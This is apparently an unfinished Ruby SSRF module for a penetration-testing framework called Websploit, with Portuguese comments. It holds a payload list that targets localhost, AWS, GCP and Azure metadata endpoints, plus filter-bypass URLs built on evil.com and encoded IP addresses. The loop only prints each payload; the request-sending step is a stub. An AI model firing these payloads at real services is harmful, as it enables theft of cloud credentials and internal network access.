require_relative '../../core/base_module'

module Websploit
  class SsrfExploit < Websploit::BaseModule
    path 'exploit/ssrf'

    register_option 'TARGET', default: '', required: true, description: 'Target URL'
    register_option 'PARAM', default: 'url', required: false, description: 'Parameter to test'
    register_option 'METHOD', default: 'GET', required: false, description: 'HTTP Method (GET/POST)'

    def run
      target = options["TARGET"][:current]
      param = options["PARAM"][:current]
      method = options["METHOD"][:current]

      puts "[*] Testing SSRF on #{target}"
      puts "[*] Parameter: #{param}"
      puts "[*] Method: #{method}"

      # Lista de payloads SSRF
      payloads = [
        # Localhost
        'http://localhost',
        'http://127.0.0.1',
        'http://[::1]',
        'http://0.0.0.0',
        
        # AWS Metadata
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/user-data/',
        
        # GCP Metadata
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://metadata.google.internal/computeMetadata/v1/instance/',
        
        # Azure Metadata
        'http://169.254.169.254/metadata/instance',
        'http://169.254.169.254/metadata/v1/',
        
        # Bypass techniques
        'http://localhost@evil.com',
        'http://127.0.0.1#evil.com',
        'http://[::1]%23evil.com',
        'http://0.0.0.0%00evil.com',
        'http://127.1',
        'http://127.0.1',
        'http://2130706433',
        'http://0177.0.0.1',
        'http://0x7f.0x0.0x0.0x1'
      ]

      payloads.each do |payload|
        puts "[*] Testing payload: #{payload}"
        # Implementação do teste SSRF aqui
      end
    end
  end
end 